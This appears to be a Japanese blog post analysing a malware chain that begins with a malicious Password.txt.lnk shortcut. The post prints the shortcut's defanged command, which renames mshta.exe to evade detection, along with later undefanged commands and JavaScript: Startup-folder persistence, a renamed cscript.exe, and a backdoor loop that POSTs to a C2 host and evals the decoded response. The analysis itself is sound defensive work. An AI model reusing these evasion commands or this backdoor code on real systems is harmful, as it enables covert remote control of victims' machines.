# javascriptベースのマルウェア

最近ほんとに流行りのLnkから始まるマルウェアを見てみました。  
Lnkを使うこと自体はだいぶ前からあった気がしますが、今更また流行るってのが面白いですね。そういえばマクロマルウェアもだいぶ時間おいてから再流行してその後根強い人気となってますからね。  

さて、今回見てみたのは以下のtwitterで流れてきたものです。  
https://twitter.com/b3ard3dav3ng3r/status/1550028730147700736

ちなみにany.runでの実行結果が出てます。

- 最初のlnkファイル : https://app.any.run/tasks/acc18921-f3b6-4640-a80b-65f68cf4f822/
- 最後のjavascript : https://app.any.run/tasks/6042ff9e-7c9f-427d-95af-f06442d182a5/


大本は以下のlnkファイルです。  
- Password.txt.lnk
- f7170b70a89f4b5d196e3a09c1d6135d36320548f66cdc2c55bf725b0f8d4ab8

メールで直接Lnkファイルが届いたと。せめてzipで包むぐらいしろ、と言いたくなりますが。  
それにpassword.txt.lnkという興味深いファイル名。さすがに開くなよと言いたくなりますが、開く人はたくさんいるのでしょうね。  

### マルウェアの概要挙動

さて、このlnkファイルは以下のようなコマンドを実施しています。

```cmd
"C:\Windows\System32\cmd[.]exe" /q /c type C:\Windows\system32\msh*[.]exe>C:\Users\Public\msh&ren C:\Users\Public\* *ta[.]exe&for %i IN (C:\Users\Public\ms*[.]exe) DO start /b %~ni "hxxps://file[.]fclouddown[.]co/fhivQlXHH+cu3GzSJA3kQ6IKF4fB587js5CfkMQWe00="
```
Note: デファングしてます。
※余談ですが、ずっとマスクやサニタイズと言ってましたが、デファングが正しいみたいですね。。

このコマンドが素晴らしいですね。twitterでも`Nice Trick!`て声が出てました。  
`mshta.exe`をコマンドで打つと検知される可能性が高いので、それをコピーして別フォルダで実行。さらにコピーは`copy`コマンドを使わずtypeとリダイレクトでやるというのがいいですね。  
```cmd
C:\Windows\system32\msh*[.]exe>C:\Users\Public\msh&ren C:\Users\Public\* *ta[.]exe
```

さらに実行ファイル名を出さないようにしてます。  
```cmd
for %i IN (C:\Users\Public\ms*[.]exe) DO start /b %~ni "hxxps://file[.]fclouddown[.]co/fhivQlXHH+cu3GzSJA3kQ6IKF4fB587js5CfkMQWe00="
```

中々考えられた検知回避だな、と思います。  
さて、次はmshtaが動いた後にどうなるか？です。  
まずは、password.txtを作成してそれをNotePadで開いてます。偽装行為ですね。  
次にqmprs.jsというファイルを作成し、scmp.exe(実はcscript)で実行しています。  

実際にmshtaから実行されているコマンドを見てみましょう。

```cmd
"C:\Windows\System32\cmd.exe" /c start /b C:\Users\Public\scmp.exe "C:\Users\admin\AppData\Local\Temp\qmprs.js" file.fclouddown.co/ 1 & start /b C:\Users\Public\scmp.exe "C:\Users\admin\AppData\Local\Temp\qmprs.js" file.fclouddown.co/ 2 & move "C:\Users\admin\AppData\Local\Temp\Box.lnk" "C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
```

重要なことは以下です。
1. Start MenuにBox.lnkというファイルを置くことで永続性を追加
2. qmprs.jsはscmp.exeで実行
3. scmp.exeのハッシュはcscript.exe
4. qmprs.jsの引数になっている`file[.]fclouddown[.]co`はc2

scmp.exeなんてファイルは本来存在しません。なのでこれはmshtaが作成したようです。さて、次にではmshtaで渡されたソースの内容を見てみましょう。

### ペイロードの内容を見てみる

頭の方をまずは見ますと以下ですが、当然難読化されています。とはいえ簡単な内容ですね。  

```js
<script language="javascript">
var fes="Scrip";
function \u0064\u0065c\u00364(bi){var o\u0074="";try{var \u0064=(new A\u0063\u0074i\u0076eXObj\u0065c\u0074("\x4d\123Xml2"+".DOM"+"\u0044\u006f\143\x75\x6d\x65n\x74")).c\u0072ea\u0074\u0065\u0045le\u006d\u0065n\u0074("\u0062\141\163e");var \u0061=new Activ\u0065XObject("AD\u004f"+"DB.S\164ream");d.\u0064ata\u0054ype="bin\x2e\142ase64";\u0064.te\u0078t=bi;a.t\u0079pe=1;a.\u006f\u0070en();a.\u0077rite(d.n\u006f\u0064e\u0054\u0079\u0070edVal\u0075\u0065);a.position=0;a.\u0074\u0079p\u0065=2;a.c\u0068a\u0072S\u0065\u0074="u\x74f-8";\u006f\u0074=\u0061.r\u0065adText;a.close()}catch(e){ot=""}return ot}
// 省略
```

さて、簡単に重要なところだけ見ていきましょう。  
※ちなみに取得が分かれていると思われ、jsのファイル名が違いますが、ご容赦ください。

まず、攻撃ファイルを作成しています。以下にある`dec64()`という関数も本スクリプト内で作成されています。  

```js
var lp="dmFy～省略～KCl9"; // これが本当のペイロード。base64になっている
var jp=osf.GetSpecialFolder(2)+"\\vqngxa.js"; // 2はtempフォルダ
var fh=osf.CreateTextFile(jp,2,true); fh.WriteLine(dec64(lp)); fh.Close(); // jsファイルの書き込み
```

さらに、cscript.exeをpublic配下のファイルとしてコピーしてます。  

```js
var x="C:\\Users\\Public\\ldmc.exe";
try{osf.CopyFile("C:\\Windows\\System32\\cscript.exe",x)}catch(e){}
```

そして実行しています。

```js
try{osf.CopyFile("C:\\Windows\\System32\\cscript.exe",x)}catch(e){}
var l=" start /b "+x+" \""+jp+"\" file.fclouddown.co/ ";
l="CMD.exe /c"+l+"1 &"+l+"2";
function Expands(){swh.run(l,0,false);window.close()}
Expands();
```

ついでに、以下で環境変数をセットしていますが、ちょっとこれは不明です。何かに使うのかダミーの操作なのか。  

```js
var swh=new ActiveXObject(w);
swh.Environment("PROCESS").Item("JVER")="21";
```

さて、次は本来のペイロードであるbase64コマンドを見ていきましょう。  

### 実ペイロードであるcscriptで実行されるjsファイルを見てみる

まずは、通信先情報がありました。引数で渡した`file[.]fclouddown[.]co`はここで利用されているようですね。ちなみに最初が数字で始まる場合は`https`にするようです。  
Note: file[.]～ならhttp。0file[.]ならhttpsといった形ですね。  

```js
var saddr="http";
var prfx=WScript.arguments(0);
if(isNaN(prfx.substring(0,1))==true){saddr+="s"}
saddr+="://"+prfx;
```

さて、次にメイン挙動を見てみます。  

```js
function ads(){
	var xml=WScript.CreateObject(stm);
	var rxt="";
	try{
		xml.setOption(2,13056);
		xml.open("POST",saddr);
		xml.setRequestHeader("Content-Type","text/html");
		xml.setRequestHeader("Content-Length",s.length);
		xml.send(s);
		rxt=xml.responseText;
		xml=null;
        if(rxt.length>=1){eval(dec64(rxt))};
	}catch(e){}
	WScript.Sleep(15*1000)
}
while(true){ads()}"
```

何となくわかりますかね？重要なところが以下のように2個所あります。  
1. POSTリクエストを送信
2. レスポンス結果をevalで実行している

```js
xml.open("POST",saddr); // 1
// 省略
rxt=xml.responseText;
if(rxt.length>=1){eval(dec64(rxt))} // 2
```

つまり、このマルウェアはバックドアです。既に攻撃者から任意操作ができるようになっています。恐ろしいですね。  

### 終わりに

この系統(lnkファイル)は、LoLの手法が大量に研究されている現代ではかなり脅威的なものだと思います。今後もマクロと共に流行っていくでしょう。

ぜひ、皆さんもメールで受け取るファイルは怪しいものとして注意していきましょう。  
